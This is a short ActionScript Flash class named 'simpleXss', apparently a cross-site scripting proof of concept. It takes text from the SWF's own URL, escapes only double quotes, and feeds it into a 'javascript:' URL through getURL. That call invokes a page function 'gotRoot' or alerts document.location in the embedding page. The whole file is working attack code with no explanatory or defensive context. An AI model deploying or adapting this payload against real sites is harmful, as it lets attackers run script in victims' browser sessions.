class simpleXss {
 static function main(){
  var searchAndReplace =  function (holder, searchfor, replacement) {
	var temparray = holder.split(searchfor);
	holder = temparray.join(replacement);
	return (holder);
} 
   var swfurl = _root._url;
     swfurl  =  swfurl.substr(swfurl.lastIndexOf("=")+1,swfurl.length );
    swfurl  =  swfurl.substr(swfurl.lastIndexOf("!")+1,swfurl.length );
   swfurl= searchAndReplace(swfurl,'"','&quot;')
  getURL('javascript:try{gotRoot("'+swfurl+'")}catch(e){alert(document.location)}');

  }
}
